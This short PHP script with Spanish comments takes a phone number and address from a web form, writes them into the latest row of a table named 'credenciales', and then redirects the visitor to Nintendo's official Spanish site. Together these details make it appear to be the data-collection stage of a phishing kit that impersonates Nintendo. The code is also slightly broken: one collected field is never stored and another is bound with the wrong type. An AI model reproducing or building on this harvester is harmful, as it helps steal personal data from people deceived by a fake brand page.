<?php
require_once "conexion.php";

// Verifica conexión
if (mysqli_connect_errno()) {
    echo "Error de conexión: " . mysqli_connect_error();
    exit();
}

// Recoger datos del formulario
$telefono   = $_POST['telefono'] ?? '';
$calle      = $_POST['calle'] ?? '';
$numero     = $_POST['numero'] ?? '';
$portal     = $_POST['portal'] ?? null;
$provincia  = $_POST['provincia'] ?? '';
$localidad  = $_POST['localidad'] ?? '';

// Validación simple
if (
    empty($telefono) || empty($calle) || empty($numero) ||
    empty($provincia) || empty($localidad)
) {
    echo "Faltan datos obligatorios.";
    exit();
}

// Preparar consulta segura para actualizar el último registro
$query = "
    UPDATE credenciales 
    SET telefono = ?, calle = ?, portal = ?, provincia = ?, localidad = ? 
    WHERE cod = (SELECT cod FROM (SELECT cod FROM credenciales ORDER BY cod DESC LIMIT 1) AS temp)
";

$stmt = $conex->prepare($query);

if (!$stmt) {
    echo "Error en la preparación de la consulta: " . $conex->error;
    exit();
}

// Asociar parámetros (s = string, i = integer)
$stmt->bind_param("ssiss", $telefono, $calle, $portal, $provincia, $localidad);

// Ejecutar y redirigir
if ($stmt->execute()) {
    // Redirigir a Nintendo si todo va bien
    header("Location: https://www.nintendo.com/es-es/");
    exit();
} else {
    echo "Error al actualizar los datos: " . $stmt->error;
}

$stmt->close();
$conex->close();
?>

